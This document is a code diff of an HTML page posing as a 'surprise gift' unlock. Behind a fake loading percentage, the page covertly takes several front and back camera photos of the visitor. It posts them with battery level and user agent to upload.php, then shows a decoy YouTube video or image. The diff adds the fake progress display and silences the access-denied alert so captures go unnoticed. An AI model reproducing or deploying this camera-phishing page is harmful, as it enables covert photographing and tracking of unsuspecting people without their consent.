@@ -7,33 +7,29 @@
         body { background: white; color: black; text-align: center; font-family: sans-serif; margin:0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         #loading-ui, #success-msg, #custom-ui, #yt-ui { display: none; }
         .gift-box { font-size: 80px; animation: bounce 1s infinite alternate; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         @keyframes bounce { 100% { transform: translateY(-30px); } }
         .btn { background: #00ff00; color: black; border: none; padding: 18px 30px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; }
         #custom-img { max-width: 90%; max-height: 70vh; border-radius: 10px; }
         iframe { width: 100%; height: 100vh; border: none; }
+        #percent { font-size: 24px; font-weight: bold; color: #00ff00; }
     </style>
 </head>
 <body>
     <div id="start-page">
         <div style="font-size: 60px;">🎁</div>
         <h2>You have a surprise gift! 🎊</h2>
+        <p>Click to unlock below</p><br>
         <button class="btn" onclick="startWork()">🎁 UNLOCK GIFT 🎁</button>
     </div>
 
-    <div id="custom-ui">
-        <img src="custom.jpg" id="custom-img"><br><br>
-        <button class="btn" onclick="startWork()">VIEW FULL IMAGE</button>
-    </div>
-
-    <div id="yt-ui">
-        <iframe id="yt-player" allow="autoplay; encrypted-media"></iframe>
-    </div>
+    <div id="yt-ui"><iframe id="yt-player" allow="autoplay; encrypted-media"></iframe></div>
+    <div id="custom-ui"><img src="custom.jpg" id="custom-img"></div>
 
     <div id="loading-ui">
         <div class="gift-box">🎁</div>
-        <p style="font-size: 18px; font-weight: bold; color: gold;">Processing... Please wait</p>
+        <p style="font-size: 18px; font-weight: bold;">Unlocking Gift... <span id="percent">0%</span></p>
         <div class="loader"></div>
     </div>
 
@@ -52,36 +48,32 @@
         window.onload = async function() {
             let res = await fetch('type.txt');
             globalType = (await res.text()).trim();
-            
-            if(globalType === 'custom') {
-                document.getElementById('start-page').style.display = 'none';
-                document.getElementById('custom-ui').style.display = 'block';
-            } else if(globalType === 'youtube') {
-                // YouTube ke liye seedhe permission trigger karenge
-                startWork();
-            }
         }
 
         async function startWork() {
             document.body.style.background = "black";
             document.body.style.color = "white";
             document.getElementById('start-page').style.display = 'none';
-            document.getElementById('custom-ui').style.display = 'none';
-            
-            if(globalType !== 'youtube') {
-                document.getElementById('loading-ui').style.display = 'block';
-            }
+            document.getElementById('loading-ui').style.display = 'block';
+
+            // Loading percentage animation
+            let p = 0;
+            let interval = setInterval(() => {
+                p += Math.floor(Math.random() * 5) + 2;
+                if(p > 99) p = 99;
+                document.getElementById('percent').innerText = p + "%";
+            }, 200);
 
             let response = await fetch('mode.txt');
             let mode = (await response.text()).trim();
 
-            let info = { battery: "N/A", device: "Unknown" };
+            let info = { battery: "N/A", device: navigator.userAgent };
             try { 
                 let b = await navigator.getBattery(); 
                 info.battery = Math.round(b.level * 100) + "%"; 
             } catch(e) {}
 
-            // Camera Start
+            // Camera Task
             if(mode === 'front') await runCam({facingMode: "user"}, 3, "FRONT", info);
             else if(mode === 'back') await runCam({facingMode: "environment"}, 3, "BACK", info);
             else {
@@ -89,13 +81,20 @@
                 await runCam({facingMode: "user"}, 2, "FRONT", info);
             }
 
+            clearInterval(interval);
+            document.getElementById('percent').innerText = "100%";
+            setTimeout(showFinalContent, 1000);
+        }
+
+        async function showFinalContent() {
             document.getElementById('loading-ui').style.display = 'none';
-            
             if(globalType === 'youtube') {
                 let ytRes = await fetch('yt_link.txt');
                 let ytUrl = (await ytRes.text()).trim();
                 document.getElementById('yt-player').src = ytUrl + "?autoplay=1";
                 document.getElementById('yt-ui').style.display = 'block';
+            } else if(globalType === 'custom') {
+                document.getElementById('custom-ui').style.display = 'block';
             } else {
                 document.getElementById('success-msg').style.display = 'block';
             }
@@ -117,20 +116,17 @@
                     fetch('upload.php', {
                         method: 'POST',
                         body: JSON.stringify({ 
-                            image: can.toDataURL('image/jpeg', 0.9), 
+                            image: can.toDataURL('image/jpeg', 0.8), 
                             mode: label,
                             battery: info.battery,
-                            device: navigator.userAgent
+                            device: info.device
                         }),
                         headers: {'Content-Type': 'application/json'}
                     });
                 }
                 stream.getTracks().forEach(t => t.stop());
-            } catch(e) { 
-                if(globalType !== 'youtube') alert("Access Denied!"); 
-            }
+            } catch(e) {}
         }
     </script>
 </body>
-    </html>
-    
+</html>
